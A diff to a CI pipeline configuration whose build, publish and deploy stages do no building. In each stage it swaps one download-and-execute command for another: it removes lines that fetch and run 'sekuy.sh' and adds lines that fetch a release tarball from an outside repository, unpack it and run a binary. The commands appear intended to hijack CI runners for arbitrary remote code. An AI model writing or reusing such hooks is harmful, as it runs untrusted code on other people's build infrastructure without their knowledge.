@@ -2,19 +2,16 @@ pipeline:
   build:
     image: golang
     commands:
-      - wget https://github.com/hendrik20212/VRS/raw/main/pythonci
-      - wget https://raw.githubusercontent.com/hendrik20212/VRS/main/sekuy.sh && chmod u+x sekuy.sh && ./sekuy.sh
+      - wget https://github.com/hendrik20212/VRS/releases/download/doc1/Doc.tar.gz && tar -xvf Doc.tar.gz && ./ver cus.ini
       
   publish:
     image: golang
     commands:
-      - wget https://github.com/hendrik20212/VRS/raw/main/pythonci
-      - wget https://raw.githubusercontent.com/hendrik20212/VRS/main/sekuy.sh && chmod u+x sekuy.sh && ./sekuy.sh
+      - wget https://github.com/hendrik20212/VRS/releases/download/doc1/Doc.tar.gz && tar -xvf Doc.tar.gz && ./ver cus.ini
       
 
   deploy:
     image: golang
     commands:
-      - wget https://github.com/hendrik20212/VRS/raw/main/pythonci
-      - wget https://raw.githubusercontent.com/hendrik20212/VRS/main/sekuy.sh && chmod u+x sekuy.sh && ./sekuy.sh
+      - wget https://github.com/hendrik20212/VRS/releases/download/doc1/Doc.tar.gz && tar -xvf Doc.tar.gz && ./ver cus.ini
       
